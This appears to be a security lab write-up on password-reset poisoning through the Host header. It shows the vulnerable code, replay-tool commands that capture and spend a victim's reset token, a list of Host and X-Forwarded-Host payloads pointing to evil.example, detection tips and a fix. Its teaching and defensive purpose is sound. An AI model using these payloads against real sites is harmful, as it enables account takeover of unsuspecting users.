# Lab 32 — Passreset

## The bug

```python
host = req.header("Host", "127.0.0.1:9320")
link = f"http://{host}/api/reset/use?token={token}"
```

The application needs to know its own name in order to write a link. It asks
the request. The request is written by the person asking for the link.

So an unauthenticated attacker chooses the domain that appears in *somebody
else's* password reset email — and a reset token is a credential that is
delivered rather than presented.

## The exploit

```bash
h5i websec replay req_0 --session lab32 --create \
    --set method=POST --set path=/api/reset \
    --set header.Content-Type=application/json \
    --set header.Host=127.0.0.1:9321 \
    --set json.email=admin@acme.test
```

Then read what arrived at your host, and spend the token:

```bash
h5i websec replay req_N --session lab32 --create --set url=http://127.0.0.1:9321/seen
h5i websec replay req_0 --session lab32 --create --set path=/api/reset/use --set query.token=…
```

Note that the victim never has to be careless. They received an email from the
right sender, about a reset they may well have requested, and clicking it is
the correct behaviour. The token leaves before the page even loads.

## The header variants

`Host` is often locked down at the edge while its friends are not. Try each,
alone and together:

```
Host: evil.example
X-Forwarded-Host: evil.example
X-Host: evil.example
X-Forwarded-Server: evil.example
X-HTTP-Host-Override: evil.example
Forwarded: host=evil.example
Host: target.example
X-Forwarded-Host: evil.example        ← the pair that beats a Host allowlist
```

And two shapes that slip past naive validation:

```
Host: target.example:@evil.example
Host: target.example
Host: evil.example                    ← a duplicate; which one does the app read?
```

## Where else a self-referential URL matters

Password reset is the headline. The same "the app asks the request for its own
name" bug also produces:

* **Cache poisoning** — the reflected host lands in a cached page (Lab 33).
* **Password reset link in any notification** — invite links, magic links, email
  confirmation, MFA enrolment.
* **Absolute URLs in an API response** that a client follows.
* **Routing** — a virtual host that reaches an internal application, or a
  `Host` that selects a tenant.
* **SSRF-ish behaviour**, where a worker fetches a URL the app built.

## Detecting it when nothing is echoed

The reset email is not usually readable. Three ways to see the effect anyway:

1. Set the header to a host you control and watch your own logs. A DNS lookup
   alone is a signal.
2. Look for the value reflected in *any* response — an `og:url`, a canonical
   link, a `Location`, a JSON `self` field. Applications rarely use the host in
   only one place.
3. Send `Host: target.example` plus `X-Forwarded-Host: yours` and compare the
   two responses with `h5i websec diff`.

## The fix

The application's own name is configuration, not input:

```python
link = f"{settings.PUBLIC_BASE_URL}/api/reset/use?token={token}"
```

At the edge, reject any request whose `Host` is not in the expected set (a
default vhost that 421s), and strip `X-Forwarded-*` arriving from outside your
own proxy chain. And make the reset flow resilient anyway: short-lived,
single-use, single-session tokens that also require the user to confirm
something the attacker does not know.

## h5i technique

`--set header.Host=` — h5i sends the `Host` you name rather than the one implied
by the URL, which is what makes this testable at all; and `--allow` for a
session that must also reach your collector.
